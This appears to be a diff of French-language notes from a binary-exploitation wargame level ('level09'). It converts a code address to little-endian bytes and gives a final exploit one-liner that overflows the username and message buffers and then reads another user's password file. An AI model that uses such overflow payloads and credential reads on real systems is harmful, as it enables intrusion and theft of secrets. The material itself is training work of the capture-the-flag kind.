@@ -68,8 +68,8 @@ ecrit de ref à ref + 180 ?
 
 
 
-
-
+0x000055555555488c to little endian : 8c 48 55 55 55 55 00 00
+\x8c\x48\x55\x55\x55\x55\x00\x00
 dépasse sur message au 128 eme char dans username
 final string : 
-(python -c 'print("a" * 120 + "")' ; python -c 'print("0x000055555555488c")'; echo 'cat /home/users/end/.pass'; cat) | ./level09
+(python -c 'print("a" * 40 + "\xFF")' ; python -c 'print(200 * "b" + "\x8c\x48\x55\x55\x55\x55\x00\x00")'; echo 'cat /home/users/end/.pass') | ./level09
